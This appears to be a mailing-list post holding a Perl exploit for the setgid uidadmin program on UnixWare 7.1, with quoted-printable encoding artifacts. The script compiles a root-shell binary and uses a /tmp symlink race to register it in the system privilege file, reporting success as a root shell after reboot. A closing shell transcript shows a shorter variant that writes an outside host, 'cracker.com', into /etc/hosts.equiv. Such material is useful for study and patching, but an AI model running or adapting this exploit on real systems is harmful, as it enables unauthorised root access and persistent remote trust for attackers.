#!/usr/bin/perl

###########################################################
# /usr/bin/uidadmin exploit for UnixWare 7.1
# Uses a symlink exploit to add our program to a list of elevated privile=
ges
# programs in /etc/security/tcb/privs.  After reboot, /tmp/ui will be add=
ed
# to the list of privileged programs.
#
# Format of the privs file is as follows (ctime and size are just as
# st_ctime and st_size as described by stat(2)):
# size:checksum:time:perms:/full/path/to/prog
#
# -Brock Tellier btellier@usa.net
#
###########################################################

$ui_source =3D "/home/xnec/ui.c";
$ui_dest =3D "/home/xnec/ui";
$ui_code =3D "void main() { setreuid(0,0); system(\"/bin/ksh\");}";
$privloc =3D "/etc/security/tcb/privs";
$uidatafile=3D"/tmp/uidata";
$sumpath =3D "/usr/bin/sum";
$uidata_sym =3D "/tmp/uidata.tmp";
$compiler =3D "cc";
$uidadmin =3D "/usr/bin/uidadmin";

###
# Path to the directory where your $uidata_sym will exist relative to
# /etc/uidata/
###
$uidadminarg =3D "../../tmp";


print("\n* uidadmin exploit for UnixWare 7.1 <btellier\@usa.net>\n\n");

###
# Output $ui_code to $ui_source and compile into $ui_dest
###

open(UIS, ">$ui_source");
printf(UIS "$ui_code\n");
close(UIS);
system ("$compiler -o $ui_dest $ui_source");
if ( -e $ui_dest ) {
   print("\n$ui_dest successfully compiled\n");
}
   else { die "error compiling $ui_dest"; }

###
# stat $ui_dest for size in bytes and ctime (seconds since epoch)
###

$size=3D(stat($ui_dest))[7] || die "cannot stat $ui_dest";
$ctime=3D(stat($ui_dest))[10];
print("$ui_dest size=3D$size ctime=3D$ctime\n");

###
# get the checksum value for $ui_dest
###

open(SUM, "$sumpath -r $ui_dest|");
$checksum=3D<SUM>;
chomp($checksum);
@sumfields=3Dsplit(' ', $checksum);
$chksum =3D @sumfields[0];
$chksum =3D~ s/^0//;

print("$ui_dest checksum is $chksum\n");

###
# Put our entry into $uidatafile, use trailing newline
###

$uidata=3D"$size:$chksum:$ctime:\%fixed,allprivs:$ui_dest";
print("placing '$uidata' into $uidatafile\n");
open(TMP, ">$uidatafile");
print(TMP "$uidata\n");
close(TMP);

###
# Create symlink from $uidata_sym to $privloc
###
symlink($privloc, $uidata_sym);

###
# All the preparation is done, launch the exploit
###

system("$uidadmin -S $uidadminarg -a -r bah");

###
# Find out if the exploit worked, assume it did if $ui_dest is in $privlo=
c
###

open (PRIV, "$privloc");
@privs =3D <PRIV>;
foreach $priv (@privs) {
   if ($priv =3D~ /$ui_dest/) {
      print("Exploit successful. Run $ui_dest after reboot for rootshell
\n");
      exit(0);
   }
}
print("Exploit not successful, sorry!\n");


--- /uix.pl ----

--- for those with little patience ---

bash-2.02$ id              =

uid=3D106(xnec) gid=3D1(other)
bash-2.02$ ls -la /etc/hosts.equiv
UX:ls: ERROR: Cannot access /etc/hosts.equiv: No such file or directory
bash-2.02$ ls -la /usr/bin/uidadmin
-r-xr-s--x    1 sys      sys           18012 Apr  3  1998 /usr/bin/uidadm=
in
bash-2.02$ ln -s /etc/hosts.equiv /tmp/uidata.tmp
bash-2.02$ echo "cracker.com" > /tmp/uidata
bash-2.02$ /usr/bin/uidadmin -S ../../tmp -a -r bah
UX:uidadmin: ERROR: mandatory field(s) missing
bash-2.02$ cat /etc/hosts.equiv
cracker.com
bash-2.02$ ls -al /etc/hosts.equiv
-rw-rw-r--    1 sys      sys              12 Dec  2 19:05 /etc/hosts.equi=
v
bash-2.02$ =


--- /patience ---
